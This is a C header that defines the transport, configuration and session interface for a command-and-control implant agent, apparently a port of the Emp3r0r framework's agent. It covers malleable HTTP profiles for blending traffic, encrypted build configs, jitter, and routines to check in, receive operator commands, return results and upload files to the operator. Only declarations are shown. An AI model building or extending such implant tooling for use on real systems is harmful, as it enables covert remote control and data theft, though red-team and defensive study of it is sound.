#ifndef C2_TRANSPORT_H
#define C2_TRANSPORT_H

/*
 * transport.h — build config, channel contract and the agent session flow.
 *
 * A C2 agent is three layers stacked:
 *
 *   c2_agent_config  ->  c2_transport  ->  c2_secureconn  ->  c2_messages
 *   (bootstrap data)     (http_poll)     (framing+crypto)    (CBOR)
 *
 * The channel is abstracted behind c2_stream (see secureconn.h). A transport
 * owns its full wire implementation: raw TCP/UDP, self-contained HTTP/TLS, or
 * an HTTP stack loaded from the host (libcurl/libssl) through dynload.h.
 */

#include "common.h"
#include "crypto.h"
#include "messages.h"
#include "secureconn.h"

#include "cbor.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ------------------------------------------------------------------------- */
/* Malleable HTTP profile (def.MalleableHTTPConfig, keys 1..8)                */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_HTTP_PATH = 1,
  C2_KEY_HTTP_SESSION_HEADER = 2,
  C2_KEY_HTTP_SESSION_VALUE = 3,
  C2_KEY_HTTP_INIT_HEADER = 4,
  C2_KEY_HTTP_INIT_VALUE = 5,
  C2_KEY_HTTP_CLOSE_HEADER = 6,
  C2_KEY_HTTP_CLOSE_VALUE = 7,
  C2_KEY_HTTP_CUSTOM_HEADERS = 8,
};

/*
 * The session/init/close carriers are configuration values, not protocol
 * constants. `session_value` contains a "%s" that the client replaces with a
 * fresh per-stream UUID. When a carrier is "Cookie" the value is merged into
 * the Cookie header with "; ".
 */
typedef struct {
  c2_str c2_path;
  c2_str session_header;
  c2_str session_value;
  c2_str init_header;
  c2_str init_value;
  c2_str close_header;
  c2_str close_value;

  /* Static headers as parallel arrays. On decode, `header_cap` is the caller's
   * capacity and `header_count` is set to the number actually decoded. */
  c2_str *header_keys;
  c2_str *header_values;
  size_t header_cap;
  size_t header_count;
} c2_http_profile;

/* ------------------------------------------------------------------------- */
/* Route names (def.C2Routing, keys 1..5)                                     */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_ROUTE_CHECKIN = 1,
  C2_KEY_ROUTE_MSG = 2,
  C2_KEY_ROUTE_FTP = 3,
  C2_KEY_ROUTE_WWW = 4,
  C2_KEY_ROUTE_PROXY = 5,
};

typedef struct {
  c2_str checkin;
  c2_str msg;
  c2_str ftp;
  c2_str www;
  c2_str proxy;
} c2_routes;

/* ------------------------------------------------------------------------- */
/* Build config (subset of def.Config needed for communication)               */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_CFG_CC_ADDRESS = 1,
  C2_KEY_CFG_CC_HOST = 2,
  C2_KEY_CFG_CC_H2_PORT = 3,
  C2_KEY_CFG_PASSWORD = 7,
  C2_KEY_CFG_CAPEM = 24,
  C2_KEY_CFG_CA_FINGERPRINT = 25,
  C2_KEY_CFG_C2_TRANSPORT_PROXY = 26,
  C2_KEY_CFG_AGENT_UUID = 32,
  C2_KEY_CFG_AGENT_UUID_SIG = 33,
  C2_KEY_CFG_AGENT_TAG = 34,
  C2_KEY_CFG_CC_TIMEOUT = 35,
  C2_KEY_CFG_PADDING_MIN = 55,
  C2_KEY_CFG_PADDING_MAX = 56,
  C2_KEY_CFG_JITTER = 57,
  C2_KEY_CFG_POLL_INTERVAL = 61,
  C2_KEY_CFG_C2_ROUTES = 75,
  C2_KEY_CFG_C2_CHANNEL_MODE = 76,
  C2_KEY_CFG_CC_HTTP_PORT = 77,
  C2_KEY_CFG_MALLEABLE_C2 = 78,
  C2_KEY_CFG_SNI = 81,
};

typedef struct {
  c2_str cc_address; /* host:port, or full URL depending on mode */
  c2_str cc_http_port;
  c2_str cc_h2_port;
  c2_str password;
  c2_str ca_pem;
  c2_str ca_fingerprint;
  c2_str c2_transport_proxy;
  c2_str agent_uuid;
  c2_str agent_uuid_sig; /* base64url CA token over the UUID */
  c2_str agent_tag;
  c2_str c2_channel_mode; /* "http_poll" (default), "h2conn", "quic", ... */
  c2_str sni;

  int32_t cc_timeout_ms;
  int32_t padding_min;
  int32_t padding_max;
  int32_t poll_interval;
  int32_t jitter;

  /* Per-build PSK seed. Patched at build time with -ldflags -X; it MUST match
   * the C2's MagicString or no frame decrypts. */
  c2_str magic_string;

  c2_routes routes;
  c2_http_profile http;
} c2_agent_config;

/*
 * Decode a CBOR build config (the plaintext produced by c2_config_decrypt).
 * Only the communication keys above are read; unknown keys are skipped.
 */
c2_status c2_agent_config_decode(CborValue *r, c2_agent_config *cfg);

/*
 * Decrypt def.AgentConfig:
 *
 *   salt[16] || nonce[12] || AES-256-GCM ciphertext||tag
 *   key = PBKDF2-HMAC-SHA256(password = MagicString, salt, 100000, 32)
 *
 * The Go agent builds this with crypto.AES_GCM_Decrypt. Returns C2_OK and the
 * CBOR plaintext in out.
 */
c2_status c2_config_decrypt(const c2_crypto_backend *be, c2_str magic,
                            const uint8_t *enc, size_t enc_len, uint8_t *out,
                            size_t out_cap, size_t *out_len);

/* ------------------------------------------------------------------------- */
/* Channel contract                                                           */
/* ------------------------------------------------------------------------- */

/*
 * A transport opens a fresh virtual stream to a URL using the malleable HTTP
 * profile (ignored by duplex transports). The returned c2_stream is the raw
 * byte pipe that SecureConn wraps. `url` is fully resolved by the caller:
 * scheme + host + port + profile path.
 */
typedef struct c2_transport_ops {
  c2_status (*open)(void *ctx, const char *url, const c2_http_profile *profile,
                    c2_stream *out);
} c2_transport_ops;

typedef struct {
  const c2_transport_ops *ops;
  void *ctx;
} c2_transport;

/*
 * Transport provider contract. Exactly one provider is compiled in, selected
 * with `TRANSPORT=<name>`: src/transport/transport_<name>.c. The provider owns
 * its context
 * and its complete wire implementation; the session passes the profile and a
 * resolved URL to c2_transport_ops.open for every stream.
 *
 * Built-ins: libcurl (HTTP/HTTPS via dynload), http_raw (plain HTTP over libc
 * sockets), and libssl (plain HTTP plus HTTPS via libssl/libcrypto). Each owns
 * its complete wire implementation, so there is no separate HTTP selector.
 *
 * Add a provider by dropping src/transport/transport_<name>.c into the tree
 * and building with TRANSPORT=<name>.
 */
c2_transport c2_transport_create(const c2_agent_config *cfg);
const char *c2_transport_name(void);

/* ------------------------------------------------------------------------- */
/* Agent session                                                              */
/* ------------------------------------------------------------------------- */

/* The message tunnel needs bounded storage for decoded command/peer lists. */
#define C2_SESSION_LIST_MAX 128u

typedef struct {
  const c2_crypto_backend *be;
  c2_transport transport;
  const c2_agent_config *config;

  uint8_t psk[C2_AES_KEY_BYTES];
  uint8_t agent_priv[C2_P256_PRIV_BYTES];
  uint8_t agent_pub[C2_P256_PUB_BYTES];

  /* Ephemeral key and derived key for the current msg tunnel. */
  uint8_t pfs_priv[C2_P256_PRIV_BYTES];
  uint8_t pfs_pub[C2_P256_PUB_BYTES];
  uint8_t session_key[C2_AES_KEY_BYTES];
  int pfs_established;
  int pfs_pending;       /* a first hello is awaiting its handshake reply */
  char hello_job_id[40]; /* JobID of the most recent hello */

  /* Owns the bytes that decoded MsgTunData fields point into. A message stays
   * valid until the next c2_session_read. */
  uint8_t *rxbuf;
  size_t rxcap;
  /* Backing storage for the decoded command/peer string lists. */
  c2_str rx_cmd_items[C2_SESSION_LIST_MAX];
  c2_str rx_peer_items[C2_SESSION_LIST_MAX];
} c2_agent_session;

/*
 * Resolve configuration into runtime state: derive the PSK from the
 * MagicString and load (or generate) the agent P-256 identity key. `agent_priv`
 * may be NULL to generate a fresh key.
 */
c2_status c2_session_init(c2_agent_session *s, const c2_crypto_backend *be,
                          c2_transport transport, const c2_agent_config *cfg,
                          const uint8_t *agent_priv);

/*
 * Set the agent identity public key when c2_session_init was given an imported
 * private key (the vtable has no "public from private" primitive). A generated
 * identity already has it.
 */
void c2_session_set_identity_pub(c2_agent_session *s,
                                 const uint8_t pub[C2_P256_PUB_BYTES]);

/* Release the session's read buffer (safe on a zeroed session). */
void c2_session_cleanup(c2_agent_session *s);

/*
 * Open `route` and send a signed MsgAuth. For auxiliary routes the SecureConn
 * is immediately re-keyed to the current PFS session key (if one is
 * established); checkin/msg stay on the PSK. `caps` must contain the route
 * token plus any feature tokens.
 */
c2_status c2_session_open_route(c2_agent_session *s, c2_str route,
                                c2_str stream_id, const c2_str_list *caps,
                                c2_secureconn *sc);

/*
 * Check in: open the checkin route, send the Emp3r0rAgent body, then wait for
 * the Tag=checkin-ok ACK. Must complete before any msg/proxy/file stream.
 */
c2_status c2_session_checkin(c2_agent_session *s, const c2_agent_info *info);

/*
 * Send a hello and process the handshake reply. `send_ephem` is 1 for the
 * first hello of a tunnel (carries EphemPublicKey and performs ECDH); later
 * hellos are pure keep-alives. On the first successful hello the msg
 * SecureConn is switched to the session key.
 */
c2_status c2_session_hello(c2_agent_session *s, c2_secureconn *msg,
                           int send_ephem);

/*
 * Decode one frame from the message tunnel into either a job or a control
 * message. Returns C2_OK and sets *is_job to 1 for a command, 0 for a control
 * message (handshake/peer_list/agent_token); the caller handles control tags.
 * `out` must have its list arrays pre-set (items/cap) like every decoder.
 */
c2_status c2_session_read(c2_agent_session *s, c2_secureconn *msg,
                          c2_msgtun *out, int *is_job);

/*
 * Send a job result: same JobID and CmdSlice as the request, Response = output.
 * The frame is written as a bulk frame (no padding). The agent's Tag/UUID and a
 * fresh UUID signature are included, exactly like the Go agent's NotifyC2: the
 * C2 routes the reply by Tag/UUID, so a reply without them is dropped with
 * "target cannot be found".
 */
c2_status c2_session_send_result(c2_agent_session *s, c2_secureconn *msg,
                                 c2_str job_id, const c2_str_list *cmd_slice,
                                 const uint8_t *response, size_t response_len);

/* File upload over the FTP route: open(ftp, token), gzip the file bytes, and
 * write them onto the SecureConn. The C2 relays the gzip stream to the
 * operator, which gunzips it. `data`/`len` is the raw (uncompressed) file. */
c2_status c2_session_upload(c2_agent_session *s, c2_str token,
                            const uint8_t *data, size_t len);

/* File download over the WWW route: open(www, name) and read until EOF. */
c2_status c2_session_download(c2_agent_session *s, c2_str name, uint8_t *out,
                              size_t out_cap, size_t *out_len);

#ifdef __cplusplus
}
#endif

#endif /* C2_TRANSPORT_H */
